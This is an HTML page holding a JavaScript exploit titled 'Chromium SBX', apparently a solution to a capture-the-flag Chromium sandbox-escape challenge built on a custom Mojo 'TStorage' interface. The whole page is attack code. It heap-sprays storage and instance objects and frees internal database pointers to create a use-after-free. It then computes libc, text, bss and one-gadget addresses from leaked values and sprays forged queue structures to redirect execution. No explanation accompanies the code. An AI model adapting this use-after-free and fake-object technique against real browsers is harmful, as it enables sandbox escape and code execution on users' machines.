<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Chromium SBX</title>
  </head>
  <body>
    <pre id="log"></pre>
    <script src="./mojo_bindings.js"></script>
    <script src="./tstorage.mojom.js"></script>
    <script>
      (async () => {
        const print = (log) => {
          let logBox = document.getElementById("log");
          if (logBox) {
            logBox.innerText += log + "\n";
          }
        };

        let tStoragePtr = new blink.mojom.TStoragePtr();
        Mojo.bindInterface(
          blink.mojom.TStorage.name,
          mojo.makeRequest(tStoragePtr).handle
        );
        await tStoragePtr.init();

        let spray = async () => {
          let storages = [];
          let instances = [];
          for (let i = 0; i < 0x100; i++) {
            let a = new blink.mojom.TStoragePtr();
            Mojo.bindInterface(
              blink.mojom.TStorage.name,
              mojo.makeRequest(a).handle
            );
            storages.push(a);

            await a.init();
            await a.createInstance().then((res) => {
              instances.push(res.instance);
            });
          }
          return { storages, instances };
        };

        let x = await spray();
        let y = await spray();

        /* free all inner_db_ptr_ in storage */
        for (const storage of x.storages) {
          await storage.init();
        }

        let libcAddr = await tStoragePtr.getLibcAddress().then((res) => {
          return res.addr;
        });
        libcAddr -= 0x40730;

        let textAddr = await tStoragePtr.getTextAddress().then((res) => {
          return res.addr;
        });
        textAddr -= 0x39b5e60;

        const bss = textAddr + 0xa86fc60;
        const oneGadget = libcAddr + 0x4f3c2;
        print("[*] libc @ 0x" + libcAddr.toString(16));
        print("[*] text @ 0x" + textAddr.toString(16));
        print("[*] bss @ 0x" + bss.toString(16));
        print("[*] oneGadget @ 0x" + oneGadget.toString(16));

        let tInstacePtr = await tStoragePtr.createInstance().then((res) => {
          return res.instance;
        });

        const sprayQueue = async (tInsPtrSprays) => {
          for (const tInsPtr of tInsPtrSprays) {
            for (let i = 0; i < 97; i++) {
              await tInsPtr.push(bss);
            }
            for (let i = 0; i < 49; i++) {
              await tInsPtr.pop();
            }
            for (let i = 0; i < 93 - 48; i++) {
              await tInsPtr.push(bss);
            }
            for (let i = 0; i < 47; i++) {
              await tInsPtr.pop();
            }
            for (let i = 0; i < 88 - 46; i++) {
              await tInsPtr.push(bss);
            }
            for (let i = 0; i < 44; i++) {
              await tInsPtr.pop();
            }
            for (let i = 0; i < 206 - 44 - 1 - 4; i++) {
              await tInsPtr.push(0xdeadbeef);
            }
            await tInsPtr.push(bss); // buffer
            await tInsPtr.push(0xffffffff); // capacity
            await tInsPtr.push(0x0); // start
            await tInsPtr.push(0x0); // end
            await tInsPtr.push(0xdeadbeef); // int_value_
          }
        };

        await sprayQueue(y.instances);
        for (const instance of x.instances) {
          const val = await instance.get(0).then((res) => {
            return res.value;
          });
          if (val == bss) {
            await instance.push(0xdeadbeef);
            await instance.push(0xdeadbeef);
            await instance.push(oneGadget);
            await instance.getTotalSize();
          }
        }
      })();
    </script>
  </body>
</html>
